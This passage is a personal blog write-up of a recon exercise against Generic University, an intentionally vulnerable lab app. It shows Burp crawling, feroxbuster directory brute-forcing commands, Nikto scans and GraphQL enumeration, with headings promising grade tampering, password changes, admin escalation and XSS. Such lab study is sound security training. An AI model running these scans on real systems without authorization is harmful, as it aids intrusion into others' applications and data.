+  <a href="#using-a-api-specific-wordlist" class="md-nav__link">
+    Using a API Specific Wordlist
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-graphql-specific-wordlist" class="md-nav__link">
+    Using GraphQL specific wordlist
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-default-content" class="md-nav__link">
+    Discover Default Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Discover Default Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nikto" class="md-nav__link">
+    Nikto
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-for-debug-parameters" class="md-nav__link">
+    Test for Debug Parameters
+  </a>
+  
+    <nav class="md-nav" aria-label="Test for Debug Parameters">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#graphql-enumeration" class="md-nav__link">
+    Graphql Enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2b-mapping-attack-surface" class="md-nav__link">
+    2b. Mapping Attack Surface
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerability-assessment-exploitation" class="md-nav__link">
+    3. Vulnerability Assessment / Exploitation
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerability Assessment / Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#api-endpoints-information-leakage" class="md-nav__link">
+    API Endpoints Information Leakage
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#graphql-api-injection" class="md-nav__link">
+    GraphQL API Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="GraphQL API Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#query" class="md-nav__link">
+    Query
+  </a>
+  
+    <nav class="md-nav" aria-label="Query">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-administrator-emails" class="md-nav__link">
+    Find Administrator Emails
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-everyones-grades" class="md-nav__link">
+    Find Everyone's Grades
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mutation" class="md-nav__link">
+    Mutation
+  </a>
+  
+    <nav class="md-nav" aria-label="Mutation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#edit-someones-grades" class="md-nav__link">
+    Edit Someone's Grades
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#change-another-accounts-password" class="md-nav__link">
+    Change Another Account's Password
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#make-a-user-account-admin" class="md-nav__link">
+    Make a user account Admin
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-on-vulnerable-forms" class="md-nav__link">
+    XSS on vulnerable forms
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crAPI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    crAPI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PG
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            PG
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PG/Linux%20-%20Cassios/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cassios
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    RE101
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            RE101
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../RE101/3.%20Simple%20Lambdas/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Simple Lambdas
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Random Thoughts
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            Random Thoughts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/010622-1824/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Pentest or... not?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Building a Personal Containerized Web Pentest Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password Management with Self-Hosted KeeWeb
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#authors-goals" class="md-nav__link">
+    Author's Goals
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2a-mapping-application-content" class="md-nav__link">
+    2a. Mapping Application Content
+  </a>
+  
+    <nav class="md-nav" aria-label="2a. Mapping Application Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#explore-visible-content" class="md-nav__link">
+    Explore Visible Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore Visible Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-exploration" class="md-nav__link">
+    Initial Exploration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#further-exploration" class="md-nav__link">
+    Further Exploration
+  </a>
+  
+    <nav class="md-nav" aria-label="Further Exploration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#registering-an-account" class="md-nav__link">
+    Registering an account
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploring-with-a-registered-account" class="md-nav__link">
+    Exploring with a Registered Account
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#consult-public-resources" class="md-nav__link">
+    Consult Public Resources
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-hidden-content" class="md-nav__link">
+    Discover Hidden Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Discover Hidden Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-discovery" class="md-nav__link">
+    Initial Discovery
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-commontxt" class="md-nav__link">
+    Using common.txt
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-a-api-specific-wordlist" class="md-nav__link">
+    Using a API Specific Wordlist
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-graphql-specific-wordlist" class="md-nav__link">
+    Using GraphQL specific wordlist
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discover-default-content" class="md-nav__link">
+    Discover Default Content
+  </a>
+  
+    <nav class="md-nav" aria-label="Discover Default Content">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nikto" class="md-nav__link">
+    Nikto
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-for-debug-parameters" class="md-nav__link">
+    Test for Debug Parameters
+  </a>
+  
+    <nav class="md-nav" aria-label="Test for Debug Parameters">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#graphql-enumeration" class="md-nav__link">
+    Graphql Enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2b-mapping-attack-surface" class="md-nav__link">
+    2b. Mapping Attack Surface
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-vulnerability-assessment-exploitation" class="md-nav__link">
+    3. Vulnerability Assessment / Exploitation
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Vulnerability Assessment / Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#api-endpoints-information-leakage" class="md-nav__link">
+    API Endpoints Information Leakage
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#graphql-api-injection" class="md-nav__link">
+    GraphQL API Injection
+  </a>
+  
+    <nav class="md-nav" aria-label="GraphQL API Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#query" class="md-nav__link">
+    Query
+  </a>
+  
+    <nav class="md-nav" aria-label="Query">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-administrator-emails" class="md-nav__link">
+    Find Administrator Emails
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-everyones-grades" class="md-nav__link">
+    Find Everyone's Grades
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mutation" class="md-nav__link">
+    Mutation
+  </a>
+  
+    <nav class="md-nav" aria-label="Mutation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#edit-someones-grades" class="md-nav__link">
+    Edit Someone's Grades
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#change-another-accounts-password" class="md-nav__link">
+    Change Another Account's Password
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#make-a-user-account-admin" class="md-nav__link">
+    Make a user account Admin
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-on-vulnerable-forms" class="md-nav__link">
+    XSS on vulnerable forms
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="generic-university">Generic University<a class="headerlink" href="#generic-university" title="Permanent link">&para;</a></h1>
+<p><a href="https://github.com/InsiderPhD/Generic-University">Generic University</a> is a "Under Construction" vulnerable web application for student of generic university to see their grades online. This project can be found under <a href="https://owasp.org/www-project-vulnerable-web-applications-directory/">OWASP Vulnerable Web Applications DIrectory</a>. It contains some of the vulnerabilities found in <a href="https://github.com/InsiderPhD/Generic-University#vulnerabilities">OWASP API Top 10 2019</a> and with very clear <a href="#authors-goals">goals</a>.</p>
+<p>My Personal Objective in this undertaking would be to go through my workflow to refine the enumeration steps. The enumeration done here will be focused on Application Profiling. Next objective will be to find all the vulnerabilities that is in the author's goals. A good reference would be the docker image creator -  busk3r's own <a href="https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24">writeup</a>. </p>
+<h2 id="authors-goals">Author's Goals<a class="headerlink" href="#authors-goals" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>S/N</th>
+<th>Goals</th>
+<th>Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Find the emails of the administrator</td>
+<td><a href="#find-administrator-emails">#Find Administrator Emails</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Brute force the API to find new endpoints</td>
+<td><a href="#discover-hidden-content">#Discover Hidden Content</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Find out what grades everyone got in a class</td>
+<td><a href="#find-everyones-grades">#Find Everyone's Grades</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Edit someone's grade</td>
+<td><a href="#edit-someones-grades">#Edit Someone's Grades</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Make an account</td>
+<td><a href="#registering-an-account">#Registering an account</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Access the GraphQL API</td>
+<td><a href="#graphql-enumeration">#Graphql Enumeration</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Change another account's password</td>
+<td><a href="#change-another-accounts-password">#Change Another Account's Password</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>Login to your account</td>
+<td><a href="#exploring-with-a-registered-account">#Exploring with a Registered Account</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Access admin API</td>
+<td><a href="#make-a-user-account-admin">#Make a user account Admin</a></td>
+</tr>
+<tr>
+<td>10</td>
+<td>Find out what vulnerabilities the IT admins have ignored</td>
+<td><a href="#exploring-with-a-registered-account">#Exploring with a Registered Account</a></td>
+</tr>
+<tr>
+<td>11</td>
+<td>Make your account an admin</td>
+<td><a href="#make-a-user-account-admin">#Make a user account Admin</a></td>
+</tr>
+<tr>
+<td>12</td>
+<td>Access the admin control panel</td>
+<td><a href="#exploring-with-a-registered-account">#Exploring with a Registered Account</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Fire a blind XSS in the admin control panel and validate with your new admin account</td>
+<td><a href="#xss-on-vulnerable-forms">#XSS on vulnerable forms</a></td>
+</tr>
+<tr>
+<td>14</td>
+<td>Delete everything</td>
+<td><a href="#make-a-user-account-admin">#Make a user account Admin</a></td>
+</tr>
+<tr>
+<td>15</td>
+<td>Restore everything</td>
+<td><a href="#make-a-user-account-admin">#Make a user account Admin</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="2a-mapping-application-content">2a. Mapping Application Content<a class="headerlink" href="#2a-mapping-application-content" title="Permanent link">&para;</a></h2>
+<h3 id="explore-visible-content">Explore Visible Content<a class="headerlink" href="#explore-visible-content" title="Permanent link">&para;</a></h3>
+<h4 id="initial-exploration">Initial Exploration<a class="headerlink" href="#initial-exploration" title="Permanent link">&para;</a></h4>
+<ul>
+<li>We do an initial exploration by setting up burp and exploring the visible web pages with burp proxy and passive crawling turned on. In the table are that of the visible content visited.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Screenshots</th>
+<th>Screenshots</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Pasted image 20220817152125.png" src="../Media/Pasted%20image%2020220817152125.png" /></td>
+<td><img alt="Pasted image 20220817152148.png" src="../Media/Pasted%20image%2020220817152148.png" /></td>
+</tr>
+<tr>
+<td><img alt="Pasted image 20220817152207.png" src="../Media/Pasted%20image%2020220817152207.png" /></td>
+<td><img alt="Pasted image 20220817152854.png" src="../Media/Pasted%20image%2020220817152854.png" /></td>
+</tr>
+<tr>
+<td><img alt="Pasted image 20220817152607.png" src="../Media/Pasted%20image%2020220817152607.png" /></td>
+<td><img alt="Pasted image 20220817152620.png" src="../Media/Pasted%20image%2020220817152620.png" /></td>
+</tr>
+<tr>
+<td><img alt="Pasted image 20220817152930.png" src="../Media/Pasted%20image%2020220817152930.png" /></td>
+<td><img alt="Pasted image 20220817152945.png" src="../Media/Pasted%20image%2020220817152945.png" /></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>The following sitemap is obtained.</li>
+</ul>
+<p><img alt="Pasted image 20220817164113.png" src="../Media/Pasted%20image%2020220817164113.png" /></p>
+<ul>
+<li>From the sitemap above, we can see that </li>
+<li>We then use Engagement tools : "Find Scripts", "Find Reference", "Find Comments"</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Tools</th>
+<th>Results</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find Script</td>
+<td><img alt="Pasted image 20220817164319.png" src="../Media/Pasted%20image%2020220817164319.png" /></td>
+</tr>
+<tr>
+<td>Find Comments</td>
+<td>No interesting comments</td>
+</tr>
+<tr>
+<td>Find References</td>
+<td><img alt="Pasted image 20220817164736.png" src="../Media/Pasted%20image%2020220817164736.png" /><img alt="Pasted image 20220817164755.png" src="../Media/Pasted%20image%2020220817164755.png" /><img alt="Pasted image 20220817164814.png" src="../Media/Pasted%20image%2020220817164814.png" /></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>
+<p>From the results extracted above, we can see that there are a few interesting links we can visit or enumerate further.</p>
+</li>
+<li>
+<p>Additionally, an interesting finding at this stage is <code>/api/users/6</code>.</p>
+</li>
+</ul>
+<p><img alt="Pasted image 20220817184910.png" src="../Media/Pasted%20image%2020220817184910.png" /></p>
+<ul>
+<li>
+<p>As highlighted above, the <code>GET</code> request sent makes use of XMLHttpRequest to send to an API endpoint to get the user with <code>id</code> 6. </p>
+</li>
+<li>
+<p>We hit a "dead end" for exploring visible content here and we will move on to the other kinds of enumeration - <a href="#discover-hidden-content">#Discover Hidden Content</a>, <a href="#discover-default-content">#Discover Default Content</a>, <a href="#consult-public-resources">#Consult Public Resources</a></p>
+</li>
+</ul>
+<h4 id="further-exploration">Further Exploration<a class="headerlink" href="#further-exploration" title="Permanent link">&para;</a></h4>
+<ul>
+<li>With results from the enumeration from <a href="#discover-hidden-content">#Discover Hidden Content</a>, <a href="#discover-default-content">#Discover Default Content</a>, we are back to exploring the application further.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Further Findings</th>
+<th>Screenshot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/register</td>
+<td><img alt="Pasted image 20220817184404.png" src="../Media/Pasted%20image%2020220817184404.png" /></td>
+</tr>
+<tr>
+<td>.htaccess</td>
+<td><img alt="Pasted image 20220817184454.png" src="../Media/Pasted%20image%2020220817184454.png" /></td>
+</tr>
+<tr>
+<td>/web.config</td>
+<td><img alt="Pasted image 20220817191904.png" src="../Media/Pasted%20image%2020220817191904.png" /></td>
+</tr>
+<tr>
+<td>/api/users</td>
+<td><img alt="Pasted image 20220817191629.png" src="../Media/Pasted%20image%2020220817191629.png" /></td>
+</tr>
+<tr>
+<td>/api/roles</td>
+<td><img alt="Pasted image 20220817191710.png" src="../Media/Pasted%20image%2020220817191710.png" /></td>
+</tr>
+<tr>
+<td>/api/classes</td>
+<td><img alt="Pasted image 20220817191744.png" src="../Media/Pasted%20image%2020220817191744.png" /></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>We use the findings above to further explore visible content. This is done by <a href="#registering-an-account">#Registering an account</a> and subsequently <a href="#exploring-with-a-registered-account">#Exploring with a Registered Account</a>.</li>
+</ul>
+<h5 id="registering-an-account">Registering an account<a class="headerlink" href="#registering-an-account" title="Permanent link">&para;</a></h5>
+<ul>
+<li>We use the <code>/register</code> function to register an account and after registration we are 
+<img alt="Pasted image 20220818112810.png" src="../Media/Pasted%20image%2020220818112810.png" />
+<img alt="Pasted image 20220818115501.png" src="../Media/Pasted%20image%2020220818115501.png" /></li>
+</ul>
+<h5 id="exploring-with-a-registered-account">Exploring with a Registered Account<a class="headerlink" href="#exploring-with-a-registered-account" title="Permanent link">&para;</a></h5>
+<ul>
+<li>With registered account we continue out enumeration. When we enumerated the <a href="#using-a-api-specific-wordlist-https-github-com-chrislockard-api_wordlist-blob-master-objects-txt">API endpoints</a> below we noticed that <code>/api/user</code> and <code>/api/admin</code>is redirected to login page. Hence we will attempt to find out more about the API endpoints with this registered account. </li>
+<li>As can be seen below, <code>/api/admin</code> gave us the admin API endpoints.</li>
+</ul>
+<p><img alt="Pasted image 20220818121137.png" src="../Media/Pasted%20image%2020220818121137.png" /></p>
+<ul>
+<li>However, we are unable to use the API endpoints as we did not have the required permissions.</li>
+</ul>
+<p><img alt="Pasted image 20220818121815.png" src="../Media/Pasted%20image%2020220818121815.png" /></p>
+<ul>
+<li>In our directory busting below, we also had a redirect when <code>/admin</code> directory was involved. Hence we will attempt to browse that page.</li>
+</ul>
+<p><img alt="Pasted image 20220818121310.png" src="../Media/Pasted%20image%2020220818121310.png" /></p>
+<ul>
+<li>We attempt to see if we can acces "Security Vulnerabilities" link and it seems like with a student account, we are able to see the security vulnerabilities.</li>
+</ul>
+<p><img alt="Pasted image 20220823001205.png" src="../Media/Pasted%20image%2020220823001205.png" /></p>
+<h3 id="consult-public-resources">Consult Public Resources<a class="headerlink" href="#consult-public-resources" title="Permanent link">&para;</a></h3>
+<p><img alt="Pasted image 20220818113616.png" src="../Media/Pasted%20image%2020220818113616.png" /></p>
+<ul>
+<li>One of the enumeration steps involved is consulting public resources and hence with this we go to the github of the author to look for some clues. Indeed, we get to know that there should be at least 4 api endpoints and based on what we found, it is possible that we are missing out on one of the endpoints and that is 'grades'.</li>
+</ul>
+<p><img alt="Pasted image 20220818114315.png" src="../Media/Pasted%20image%2020220818114315.png" /></p>
+<h3 id="discover-hidden-content">Discover Hidden Content<a class="headerlink" href="#discover-hidden-content" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Next up we will be doing directory enumeration using feroxbuster. We did not use "Discover Content" it might pollute the sitemap result with it's recursive function. Somehow feroxbuster is faster too.</li>
+</ul>
+<h4 id="initial-discovery">Initial Discovery<a class="headerlink" href="#initial-discovery" title="Permanent link">&para;</a></h4>
+<h5 id="using-commontxt">Using common.txt<a class="headerlink" href="#using-commontxt" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code>feroxbuster -u &lt;url&gt; -w /usr/share/wordlists/dirb/common.txt -o out.txt
+</code></pre></div>
+<p><img alt="Pasted image 20220817122822.png" src="../Media/Pasted%20image%2020220817122822.png" /></p>
+<ul>
+<li>Discovering APIs endpoints</li>
+</ul>
+<div class="highlight"><pre><span></span><code>feroxbuster -u &lt;url&gt;/api -w /usr/share/wordlists/dirb/common.txt -o api.txt
+</code></pre></div>
+<p><img alt="Pasted image 20220817125428.png" src="../Media/Pasted%20image%2020220817125428.png" /></p>
+<ul>
+<li>Attempted <code>/js</code>, <code>/css</code>, <code>/image</code> discovery. As can be seen below, nothing was found.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Extension</th>
+<th>Results</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/js</code></td>
+<td><img alt="Pasted image 20220817173701.png" src="../Media/Pasted%20image%2020220817173701.png" /><img alt="Pasted image 20220817173712.png" src="../Media/Pasted%20image%2020220817173712.png" /></td>
+</tr>
+<tr>
+<td><code>/css</code></td>
+<td><img alt="Pasted image 20220817173609.png" src="../Media/Pasted%20image%2020220817173609.png" /><img alt="Pasted image 20220817173642.png" src="../Media/Pasted%20image%2020220817173642.png" /></td>
+</tr>
+<tr>
+<td><code>/image</code></td>
+<td><img alt="Pasted image 20220817173935.png" src="../Media/Pasted%20image%2020220817173935.png" /><img alt="Pasted image 20220817173945.png" src="../Media/Pasted%20image%2020220817173945.png" /></td>
+</tr>
+</tbody>
+</table>
+<h5 id="using-a-api-specific-wordlist">Using a <a href="https://github.com/chrislockard/api_wordlist/blob/master/objects.txt">API Specific Wordlist</a><a class="headerlink" href="#using-a-api-specific-wordlist" title="Permanent link">&para;</a></h5>
+<ul>
+<li>We enumerated the <code>/api</code> and <code>/images</code> extension further with a wordlist that is collated by <code>chrislockard</code>.</li>
+</ul>
+<p><img alt="Pasted image 20220817174335.png" src="../Media/Pasted%20image%2020220817174335.png" />
+<img alt="Pasted image 20220817174854.png" src="../Media/Pasted%20image%2020220817174854.png" /> </p>
+<ul>
+<li>From the result above, we can see that for the API endpoints enumerated are the same with the one enumerated with <code>common.txt</code>.</li>
+</ul>
+<h5 id="using-graphql-specific-wordlist">Using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt">GraphQL specific wordlist</a><a class="headerlink" href="#using-graphql-specific-wordlist" title="Permanent link">&para;</a></h5>
+<p><img alt="Pasted image 20220822113008.png" src="../Media/Pasted%20image%2020220822113008.png" /></p>
+<ul>
+<li>From the above, we can see that graphQL is used and graphIQL(Introspection) is enabled. </li>
+</ul>
+<h3 id="discover-default-content">Discover Default Content<a class="headerlink" href="#discover-default-content" title="Permanent link">&para;</a></h3>
+<h4 id="nikto">Nikto<a class="headerlink" href="#nikto" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Using Nikto Scan on webserver</li>
+</ul>
+<p><img alt="Pasted image 20220817180324.png" src="../Media/Pasted%20image%2020220817180324.png" /></p>
+<ul>
+<li>Using <code>-root</code> scan to scan other directories that we have enumerated.</li>
+</ul>
+<p><img alt="Pasted image 20220817182606.png" src="../Media/Pasted%20image%2020220817182606.png" />
+<img alt="Pasted image 20220817184219.png" src="../Media/Pasted%20image%2020220817184219.png" /></p>
+<ul>
+<li>From the above result we see some interesting vulnerabilities being flagged like te <code>/api/users</code> being flagged as something interesting and <code>/admin</code> flagged with OSVDB-630.</li>
+</ul>
+<h3 id="test-for-debug-parameters">Test for Debug Parameters<a class="headerlink" href="#test-for-debug-parameters" title="Permanent link">&para;</a></h3>
+<p><img alt="Pasted image 20220818180619.png" src="../Media/Pasted%20image%2020220818180619.png" />
+<img alt="Pasted image 20220818180748.png" src="../Media/Pasted%20image%2020220818180748.png" />
+<img alt="Pasted image 20220818154432.png" src="../Media/Pasted%20image%2020220818154432.png" />
+<img alt="Pasted image 20220818155331.png" src="../Media/Pasted%20image%2020220818155331.png" /></p>
+<ul>
+<li>From the response above, it seems like debug mode is on.</li>
+</ul>
+<h4 id="graphql-enumeration">Graphql Enumeration<a class="headerlink" href="#graphql-enumeration" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Using <a href="https://github.com/dolevf/graphw00f">graphw00f</a>, we were able to determine that graphql is used and it can be found at <code>/graphql</code>.</li>
+</ul>
+<p><img alt="Pasted image 20220822144351.png" src="../Media/Pasted%20image%2020220822144351.png" /></p>
+<ul>
+<li>
+<p>Next we used <a href="#using-graphql-specific-wordlist-https-github-com-danielmiessler-seclists-blob-master-discovery-web-content-graphql-txt">ferox buster</a> to enumerate for any other graphql endpoints.</p>
+</li>
+<li>
+<p>Following <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql">Hacktricks</a> GraphQL guide, we did a "Basic Enumeration" and managed to find that there is yet another endpoint that was not discovered - "Vulnerabilities" </p>
+</li>
+</ul>
+<p><img alt="Pasted image 20220818172842.png" src="../Media/Pasted%20image%2020220818172842.png" /></p>
+<ul>
+<li>We found out that <code>/vulnerabilities</code> is parked under <code>/admin</code></li>
+</ul>
+<p><img alt="Pasted image 20220818173130.png" src="../Media/Pasted%20image%2020220818173130.png" /></p>
+<ul>
+<li>We then use the burp extension InQL, InQL Scanner to scan for the schema for graphQL used. </li>
+</ul>
+<p><img alt="Pasted image 20220822120844.png" src="../Media/Pasted%20image%2020220822120844.png" /></p>
